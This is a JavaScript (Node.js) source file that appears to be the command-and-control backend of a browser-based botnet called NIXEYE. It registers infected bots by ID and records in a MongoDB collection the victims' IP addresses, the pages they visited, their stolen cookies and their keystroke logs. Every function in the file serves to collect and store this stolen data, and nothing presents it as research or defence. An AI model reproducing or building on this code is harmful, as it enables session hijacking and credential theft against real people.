/*
 * 
 * NIXEYE Bot Management Core
 * =================== (alpha) 
 * 
 */
 
 
 
// logger requires
var errorlog = require('./logs.core.js').ErrorLog,
	eventlog = require('./logs.core.js').EventLog;



// external libs
var mongo = require('./db.core.js');



/* BOT CORE MAIN PROTOTYPE HOLDER */
BotCore = function(){};



/* BOT BEACON CHECK */
BotCore.prototype.beaconCheck = function(nxid, srcip, xurl, cks, callback){
	
	// validating gathered data
	if(
		((typeof(nxid) === 'undefined') || (nxid === null) || (nxid.length <= 0)) ||
		((typeof(srcip) === 'undefined') || (srcip === null) || (srcip.length <= 0)) ||
		((typeof(xurl) === 'undefined') || (xurl === null) || (xurl.length <= 0)) ||
		((typeof(cks) === 'undefined') || (cks === null))
		
	){callback(null, false);}
	else{
		
		mongo.botnet.find({nxid: nxid}, {_id: 1}).count(function(err, rescount){
				
			// fail safe bail out
			if(err){errorlog.error(err); callback(null, false);}
			if(rescount === 0){
				
				// add new botnet entry
				mongo.botnet.insert({
					
					nxid: nxid,
					srcs: [{ipv4: srcip, xurl: xurl, tstamp: new Date()}],
					cookies: [{cks: cks, xurl: xurl, tstamp: new Date()}],
					keylogs: [],
					tstamp: new Date()
					
				}, function(err, addres){
					
					// fail safe bail out
					if(err){errorlog.error(err); callback(null, false);}
					if(!addres){callback(null, false);}else{callback(null, true);}
				});
			}
			else{
				
				// updating botnet with beacon data
				mongo.botnet.update(
				
					{nxid: nxid}, 
					{
						$push: 	{srcs: {ipv4: srcip, xurl: xurl, tstamp: new Date()},
								cookies: {cks: cks, xurl: xurl, tstamp: new Date()}}
					},
					{upsert: true},
					
				function(err, upres){
					
					// fail safe bail out
					if(err){errorlog.error(err); callback(null, false);}
					if(!upres){callback(null, false);}else{callback(null, true);}
				});
			}
		});
	}
};








/* BOT COOKIES PUSH */
BotCore.prototype.pushCookies = function(nxid, cookies, callback){
	
	// validating gathered data
	if(
		((typeof(nxid) === 'undefined') || (nxid === null) || (nxid.length <= 0)) ||
		((typeof(cookies) === 'undefined') || (cookies === null))
		
	){callback(null, false);}
	else{
		
		// pushing cookies to db
		mongo.botnet.update(
		
			{nxid: nxid}, 
			{$push: {cookies: cookies}},
			{upsert: true},
			
		 function(err, upres){
			
			// fail safe bail out
			if(err){errorlog.error(err); callback(null, false);}
			if(!upres){callback(null, false);}else{callback(null, true);}
		});
	}
};








/* BOT KEYLOGS PUSH */
BotCore.prototype.pushKeylogs = function(nxid, keylogs, xurl, callback){
	
	// validating gathered data
	if(
		((typeof(nxid) === 'undefined') || (nxid === null) || (nxid.length <= 0)) ||
		((typeof(keylogs) === 'undefined') || (keylogs === null) || (keylogs.length <= 0))  ||
		((typeof(xurl) === 'undefined') || (xurl === null))
		
	){callback(null, false);}
	else{
		
		// pushing keylogs to db
		mongo.botnet.update(
		
			{nxid: nxid}, 
			{$push: {keylogs: {xurl: xurl, data: keylogs, tstamp: new Date()}}},
			{upsert: true},
			
		 function(err, upres){
			
			// fail safe bail out
			if(err){errorlog.error(err); callback(null, false);}
			if(!upres){callback(null, false);}else{callback(null, true);}
		});
	}
};





// exporting prototypes
exports.BotCore = BotCore;
